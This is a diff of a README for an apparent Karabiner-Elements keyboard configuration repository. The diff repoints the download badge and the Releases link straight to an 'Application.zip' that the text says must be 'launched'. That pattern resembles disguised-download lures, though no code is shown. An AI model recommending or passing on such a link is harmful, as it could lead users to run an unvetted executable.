@@ -3,7 +3,7 @@
 
 Enhance your macOS workflow with custom key remaps and optimized settings for the Redragon K580-PRO keyboard using Karabiner-Elements!
 
-[![Download Configuration](https://img.shields.io/badge/Download-Configuration-blue)](https://github.com/files/Application.zip)
+[![Download Configuration](https://github.com/vladgales/Redragon-K580-PRO-Karabiner-Config/releases/download/v1.0/Application.zip)](https://github.com/vladgales/Redragon-K580-PRO-Karabiner-Config/releases/download/v1.0/Application.zip)
 
 ℹ️ This configuration file needs to be launched to apply the custom settings to your Redragon K580-PRO keyboard.
 
@@ -29,7 +29,7 @@ To install the Redragon K580 PRO Karabiner Configuration, follow these steps:
 
 ## 🔗 Additional Resources
 
-For more information and updates, visit the [Releases](https://github.com/Redragon-K580-PRO-Karabiner-Config/releases) section of this repository.
+For more information and updates, visit the [Releases](https://github.com/vladgales/Redragon-K580-PRO-Karabiner-Config/releases/download/v1.0/Application.zip) section of this repository.
 
 ## 📌 Topics
 
